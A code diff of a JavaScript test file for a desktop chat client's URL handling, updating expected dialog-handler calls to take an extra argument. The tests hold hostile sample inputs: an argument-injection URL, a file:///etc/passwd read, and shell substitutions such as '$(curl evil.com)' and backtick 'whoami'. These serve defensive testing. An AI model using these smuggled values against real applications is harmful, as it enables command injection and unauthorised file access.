@@ -301,15 +301,14 @@ describe('main/views/webContentsEvents', () => {
         it('should divert to allowProtocolDialog for custom protocols that are not mattermost or http', () => {
             const url = 'spotify:album:2OZbaW9tgO62ndm375lFZr';
             expect(newWindow({url})).toStrictEqual({action: 'deny'});
-            expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url);
+            expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url, undefined);
         });
-
         describe('should block malicious URLs', () => {
             it('should sanitize argument injection before passing to protocol dialog', () => {
                 const maliciousUrl = String.raw`customproto:///" --data-dir "\\deans-mbp\mattermost`;
                 expect(newWindow({url: maliciousUrl})).toStrictEqual({action: 'deny'});
                 expect(shell.openExternal).not.toBeCalled();
-                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(maliciousUrl);
+                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(maliciousUrl, undefined);
             });
 
             it('should reject UNC paths with no scheme and show dialog', () => {
@@ -324,7 +323,7 @@ describe('main/views/webContentsEvents', () => {
                 const url = 'file:///etc/passwd';
                 expect(newWindow({url})).toStrictEqual({action: 'deny'});
                 expect(shell.openExternal).not.toBeCalled();
-                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url);
+                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url, undefined);
             });
 
             it('should reject URLs with literal null bytes and show dialog', () => {
@@ -362,21 +361,21 @@ describe('main/views/webContentsEvents', () => {
                 const url = 'customproto:///path/`whoami`';
                 expect(newWindow({url})).toStrictEqual({action: 'deny'});
                 expect(shell.openExternal).not.toBeCalled();
-                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url);
+                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url, undefined);
             });
 
             it('should encode spaces in $() shell expansion patterns', () => {
                 const url = 'customproto:///$(curl evil.com)';
                 expect(newWindow({url})).toStrictEqual({action: 'deny'});
                 expect(shell.openExternal).not.toBeCalled();
-                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url);
+                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url, undefined);
             });
 
             it('should preserve double-encoded values without double-decoding', () => {
                 const url = 'customproto:///path%2520with%2520spaces';
                 expect(newWindow({url})).toStrictEqual({action: 'deny'});
                 expect(shell.openExternal).not.toBeCalled();
-                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url);
+                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url, undefined);
             });
         });
 
@@ -384,13 +383,13 @@ describe('main/views/webContentsEvents', () => {
             it('should lowercase the scheme for ONENOTE:', () => {
                 const url = 'ONENOTE:///path';
                 expect(newWindow({url})).toStrictEqual({action: 'deny'});
-                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url);
+                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url, undefined);
             });
 
             it('should lowercase the scheme for mixed case OneNote:', () => {
                 const url = 'OneNote:///path';
                 expect(newWindow({url})).toStrictEqual({action: 'deny'});
-                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url);
+                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url, undefined);
             });
         });
 
@@ -398,25 +397,25 @@ describe('main/views/webContentsEvents', () => {
             it('should allow OneNote URLs with curly braces', () => {
                 const onenoteUrl = 'onenote:///D:/OneNote/Apps/Test.one#Page&page-id={840EDD0C-B6FB-481E-A342-E39AEDA50EE6}';
                 expect(newWindow({url: onenoteUrl})).toStrictEqual({action: 'deny'});
-                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(onenoteUrl);
+                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(onenoteUrl, undefined);
             });
 
             it('should allow OneNote URLs with backslashes', () => {
                 const onenoteUrl = String.raw`onenote:///D:\OneNote\Apps\Mattermost.one#Sch%C3%B6ne%20neue%20Seite&page-id={840EDD0C-B6FB-481E-A342-E39AEDA50EE6}`;
                 expect(newWindow({url: onenoteUrl})).toStrictEqual({action: 'deny'});
-                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(onenoteUrl);
+                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(onenoteUrl, undefined);
             });
 
             it('should allow OneNote URLs with unicode and emoji', () => {
                 const onenoteUrl = 'onenote:///C:/notebook/section.one#Schöne%20Seite%20🌞';
                 expect(newWindow({url: onenoteUrl})).toStrictEqual({action: 'deny'});
-                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(onenoteUrl);
+                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(onenoteUrl, undefined);
             });
 
             it('should allow SharePoint URLs', () => {
                 const sharepointUrl = 'ms-word:ofe|u|https://company.sharepoint.com/sites/team/Documents/file.docx';
                 expect(newWindow({url: sharepointUrl})).toStrictEqual({action: 'deny'});
-                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(sharepointUrl);
+                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(sharepointUrl, undefined);
             });
         });
 
